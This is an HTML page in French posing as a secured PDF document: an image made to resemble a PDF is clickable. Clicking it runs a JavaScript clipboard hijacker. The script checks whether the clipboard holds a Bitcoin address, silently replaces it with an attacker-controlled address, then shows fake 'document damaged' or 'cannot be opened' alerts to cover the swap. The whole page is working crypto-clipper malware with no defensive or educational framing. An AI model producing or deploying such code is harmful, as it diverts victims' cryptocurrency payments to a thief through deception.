<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Document PDF sécurisé</title>
  <style>
    body {
      background-color: #eee;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .pdf-box {
      width: 420px;
      height: 600px;
      background-image: url('https://i.imgur.com/Y2nKTr2.png'); /* image qui ressemble à un PDF */
      background-size: cover;
      cursor: pointer;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
    }
  </style>
</head>
<body>
  <div class="pdf-box" onclick="activerClipper()"></div>

  <script>
    async function activerClipper() {
      try {
        const texte = await navigator.clipboard.readText();
        const isCrypto = /^((1|3)[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59})$/.test(texte);
        if (isCrypto) {
          await navigator.clipboard.writeText("bc1qadressepiégée1234567890mod");
          alert("Le document est endommagé.");
        } else {
          alert("Ce document ne peut pas être ouvert.");
        }
      } catch (err) {
        alert("Erreur lors de l’ouverture du document.");
      }
    }
  </script>
</body>
</html>
